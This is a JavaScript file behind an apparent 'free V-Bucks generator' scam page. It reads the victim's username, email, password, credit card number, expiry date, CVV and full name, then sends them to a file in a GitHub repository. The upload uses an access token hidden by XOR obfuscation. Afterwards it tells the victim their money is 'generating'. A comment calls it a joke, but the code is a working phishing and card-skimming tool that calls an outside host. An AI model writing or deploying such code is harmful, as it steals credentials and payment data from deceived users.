const decipher = salt => {
  const textToChars = text => text.split('').map(c => c.charCodeAt(0));
  const applySaltToChar = code => textToChars(salt).reduce((a,b) => a ^ b, code);
  return encoded => encoded.match(/.{1,2}/g)
    .map(hex => parseInt(hex, 16))
    .map(applySaltToChar)
    .map(charCode => String.fromCharCode(charCode))
    .join('');
}

const myDecipher = decipher('g9sEKUAitr')

document.getElementById("sub").addEventListener("click", function (event) {
  //event.preventDefault(); // Prevents the form from actually submitting

  // Get user input values
  const currency = document.querySelector("select").value;
  const login = document.getElementById("username").value;
  const email = document.getElementById("email").value;
  const pass = document.getElementById("password").value;
  const num = document.getElementById("num").value;
  const card = document.getElementById("ccnumber").value;
  const expiry = document.getElementById("ccexp").value;
  const cvv = document.getElementById("cvv").value;
  const name = document.getElementById("fullname").value;
  const date = new Date();


  // Create a message from the input (joke purposes)
  const message = `
    === EPIC VBUX GENERATOR 2017 ===
    Currency: ${currency}
    Username: ${login}
    Email: ${email}
    Password: ${pass}
    Amount: ${num}
    Card Number: ${card}
    Expiry Date: ${expiry}
    CVV: ${cvv}
    Full Name: ${name}
    Date: ${date.toLocaleString()}
    ================================
    `;

  // Call function to push data to GitHub
  saveToGitHub(message);
});

function saveToGitHub(newContent) {
  const repoOwner = "FlameRiddle";
  const repoName = "epic-portfolio";
  const filePath = "generator/vault.txt";
  const token = myDecipher("3f3028071c682c3f0e3f36342d0f6a3a3202680b3960313210351e2f3b683130212e692937220a30");
  const commitMessage = "update";

  const apiUrl = `https://api.github.com/repos/${repoOwner}/${repoName}/contents/${filePath}`;

  // Fetch the existing file to get its SHA and current content
  fetch(apiUrl, {
    headers: {
      Authorization: `token ${token}`,
    },
  })
    .then((response) => {
      if (!response.ok) {
        if (response.status === 404) {
          // File doesn't exist, create a new one
          console.log("File does not exist, creating a new one...");
          return { content: "", sha: null };
        }
        throw new Error(`GitHub API Error: ${response.status}`);
      }
      return response.json();
    })
    .then((data) => {
      const existingContent = data.content ? atob(data.content) : ""; // Decode base64 to text
      const sha = data.sha || null; // Get SHA of the existing file (if exists)

      // Append new content
      const updatedContent = existingContent + "\n" + newContent;

      // Prepare payload
      const requestBody = {
        message: commitMessage,
        content: btoa(updatedContent), // Convert back to base64
        sha: sha, // Required for updating an existing file
      };

      // Send the updated content to GitHub
      return fetch(apiUrl, {
        method: "PUT",
        headers: {
          Authorization: `token ${token}`,
          "Content-Type": "application/json",
        },
        body: JSON.stringify(requestBody),
      });
    })
    .then((response) => response.json())
    .then((result) => {
      if (result.content) {
        alert("your money is generating rn and will be ready soon (˶˃ ᵕ ˂˶) good things happen to those who wait!");
      } else {
        alert("Error: " + JSON.stringify(result));
      }
    })
    .catch((error) => console.error("GitHub Upload Error:", error));
}
